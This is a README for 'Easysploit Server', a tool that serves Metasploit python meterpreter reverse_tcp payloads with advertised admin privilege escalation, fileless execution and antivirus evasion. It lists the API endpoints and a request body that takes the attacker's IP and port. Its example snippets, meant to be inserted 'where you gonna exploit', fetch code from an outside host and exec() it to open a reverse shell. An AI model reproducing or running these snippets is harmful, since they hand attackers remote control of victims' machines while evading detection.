# easysploit-server
## Overview
Easysploit Server is a tool designed to generate, customize, and manage Metasploit reverse_tcp payloads. It simplifies exploitation with built-in admin privilege escalation, and AV evasion capabilities, supporting fileless execution for fast, undetectable operations.

## Features
Custom Reverse_TCP Payloads
Admin Privilege Escalation
Fileless Execution (Memory-based)
Anti-Virus Evasion

## Installation
```
git clone https://github.com/Easysploit/easysploit-server.git  
cd easysploit-server  
pip install -r requirements.txt
```

## Usage
### Available Endpoints
1. **Standard python Reverse TCP Payload**
Endpoint: `/python/meterpreter/reverse_tcp`
2. **Admin Privilege Reverse TCP Payload**
Endpoint: `/python/meterpreter/reverse_tcp/admin`

### Request Body
Both endpoints require the same JSON payload:
```
{
  "LHOST": "Attacker's IP",
  "LPORT": Attacker's listening port
}
```

## Example Code
Insert this code where you gonna exploit.
1. **Standard python Reverse TCP Payload**
```
import urllib.request, json
exec(urllib.request.urlopen(urllib.request.Request("https://easysploit.rocknroll17.com/python/meterpreter/reverse_tcp", data=json.dumps({"LHOST": "Attacker's IP", "LPORT": Attacker's listening port}).encode(), headers={'Content-Type': 'application/json'})).read().decode())
```
2. **Admin Privilege Reverse TCP Payload**
```
import urllib.request, json
exec(urllib.request.urlopen(urllib.request.Request("https://easysploit.rocknroll17.com/python/meterpreter/reverse_tcp/admin", data=json.dumps({"LHOST": "Attacker's IP", "LPORT": Attacker's listening port}).encode(), headers={'Content-Type': 'application/json'})).read().decode())
```
